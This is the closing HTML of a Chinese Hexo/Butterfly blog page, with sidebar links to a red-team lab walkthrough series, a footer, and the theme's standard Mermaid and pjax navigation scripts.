class="content"><a class="title" href="/post/8d8aa198.html" title="红日红队靶场ATT&amp;CK-4">红日红队靶场ATT&amp;CK-4</a><time datetime="2026-04-19T14:50:00.000Z" title="发表于 2026-04-19 22:50:00">2026-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/8d8aa197.html" title="红日红队靶场ATT&amp;CK-3"><img src="/img/ATTcharpter3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日红队靶场ATT&amp;CK-3"/></a><div class="content"><a class="title" href="/post/8d8aa197.html" title="红日红队靶场ATT&amp;CK-3">红日红队靶场ATT&amp;CK-3</a><time datetime="2026-04-13T14:40:00.000Z" title="发表于 2026-04-13 22:40:00">2026-04-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/8d8aa196.html" title="红日红队靶场ATT&amp;CK-2"><img src="/img/ATTcharpter2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日红队靶场ATT&amp;CK-2"/></a><div class="content"><a class="title" href="/post/8d8aa196.html" title="红日红队靶场ATT&amp;CK-2">红日红队靶场ATT&amp;CK-2</a><time datetime="2026-04-05T08:50:00.000Z" title="发表于 2026-04-05 16:50:00">2026-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/8d8aa195.html" title="红日红队靶场ATT&amp;CK-1"><img src="/img/ATTcharpter1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日红队靶场ATT&amp;CK-1"/></a><div class="content"><a class="title" href="/post/8d8aa195.html" title="红日红队靶场ATT&amp;CK-1">红日红队靶场ATT&amp;CK-1</a><time datetime="2026-03-25T14:22:00.000Z" title="发表于 2026-03-25 22:22:00">2026-03-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/onepiece.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Immortal723</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索你感兴趣的内容..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
